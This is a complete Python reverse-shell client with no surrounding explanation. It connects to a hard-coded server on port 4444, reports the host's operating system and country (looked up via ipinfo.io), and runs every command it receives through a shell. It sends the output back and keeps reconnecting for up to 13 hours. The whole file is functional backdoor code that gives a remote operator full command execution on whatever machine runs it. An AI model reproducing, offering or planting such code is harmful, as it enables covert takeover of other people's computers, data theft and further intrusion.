import socket
import platform
import subprocess
import time
import os
import requests

SERVER_IP = '10.0.1.12'  # Replace with the server's IP
PORT = 4444
RECONNECT_INTERVAL = 5
TIMEOUT = 60 * 60 * 13  # 13 hours

def get_os_info():
    return platform.platform()

def get_country_info():
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()
        country = data.get("country", "Unknown")
        return country
    except Exception as e:
        return f"Error fetching country: {str(e)}"

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='ignore')
    except Exception as e:
        return str(e)

def connect():
    start_time = time.time()
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            os_info = get_os_info()
            country_info = get_country_info()
            client_info = f"{os_info}\nCountry: {country_info}"
            s.send(client_info.encode())
            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                result = execute_command(cmd)
                s.send(result.encode())
        except:
            if time.time() - start_time > TIMEOUT:
                break
            time.sleep(RECONNECT_INTERVAL)

if __name__ == '__main__':
    connect()
